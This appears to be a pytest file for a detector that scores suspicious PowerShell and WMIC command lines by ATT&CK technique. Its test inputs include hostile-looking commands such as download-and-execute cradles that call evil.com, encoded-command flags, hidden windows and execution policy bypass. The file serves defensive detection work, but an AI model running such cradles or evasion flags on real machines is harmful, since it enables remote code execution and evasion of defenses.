"""Tests for cmdline_analyzer — evasion-resistant TTP detection."""

import pytest

from services.cmdline_analyzer import analyze_cmdline, cmdline_threat_score


class TestCmdlineAnalyzer:
    def test_base64_anchor_triggers_block(self):
        """powershell.exe -enc <b64> should score 90 (auto-block)."""
        score = cmdline_threat_score("powershell.exe -enc SGVsbG8gV29ybGQgVGhpcyBpcyBhIHRlc3Q=")
        assert score >= 85

    def test_case_insensitive_download(self):
        """dOwNlOaDsTrInG should be caught (case insensitive)."""
        cmdline = "powershell.exe IEX(New-Object Net.WebClient).dOwNlOaDsTrInG('http://evil.com')"
        score = cmdline_threat_score(cmdline)
        assert score >= 70

    def test_truncated_flags(self):
        """-en (truncated -encodedcommand) should be caught."""
        score = cmdline_threat_score("powershell.exe -nop -w 1 -en SGVsbG8gV29ybGQgVGhpcyBpcyBhIHRlc3Q=")
        assert score >= 85

    def test_hidden_window_style_1(self):
        """-w 1 (numeric hidden) should be caught."""
        matches = analyze_cmdline("powershell.exe -w 1 -ep bypass IEX('evil')")
        assert any(m.technique_id == "T1059.001" for m in matches)

    def test_execution_policy_bypass(self):
        """-ep bypass should be caught."""
        matches = analyze_cmdline("powershell.exe -ep bypass Get-Process")
        assert any(m.technique_id == "T1059.001" for m in matches)
        assert any("ExecutionPolicy Bypass" in s for m in matches for s in m.signals)

    def test_iex_alias(self):
        """IEX (alias for Invoke-Expression) should be caught."""
        matches = analyze_cmdline("powershell.exe iex 'evil'")
        assert any("Invoke-Expression / IEX" in s for m in matches for s in m.signals)

    def test_multiple_evasion_flags_boost(self):
        """3+ evasion flags should boost to 85+."""
        cmdline = "powershell.exe -ep bypass -w hidden -nop IEX(New-Object Net.WebClient).DownloadString('http://x')"
        score = cmdline_threat_score(cmdline)
        assert score >= 85

    def test_clean_powershell_no_alert(self):
        """Normal powershell usage should not trigger."""
        score = cmdline_threat_score("powershell.exe -Command Get-Process")
        assert score == 0

    def test_empty_cmdline(self):
        assert analyze_cmdline("") == []
        assert analyze_cmdline("   ") == []

    def test_wmi_process_creation(self):
        """WMIC process call create should map to T1059."""
        matches = analyze_cmdline("wmic process call create 'cmd.exe /c calc'")
        assert any(m.technique_id == "T1059" for m in matches)

    def test_web_request_alias_iwr(self):
        """iwr (alias for Invoke-WebRequest) should be caught."""
        matches = analyze_cmdline("powershell.exe -ep bypass iwr 'http://evil.com'")
        assert any(m.technique_id == "T1059.001" for m in matches)

    def test_base64_decode_in_script(self):
        """[Convert]::FromBase64String should be caught."""
        matches = analyze_cmdline("powershell.exe [Convert]::FromBase64String('SGVsbG8=')")
        assert any(m.technique_id == "T1059.001" for m in matches)

    def test_non_powershell_lower_confidence(self):
        """Suspicious patterns outside powershell.exe should have lower score."""
        matches = analyze_cmdline("cmd.exe -ep bypass IEX 'evil'")
        # -ep bypass doesn't apply to cmd.exe, but IEX might be in a script
        # Should not auto-block (score < 85) since not powershell context
        score = max((m.suggested_score for m in matches), default=0)
        assert score < 85
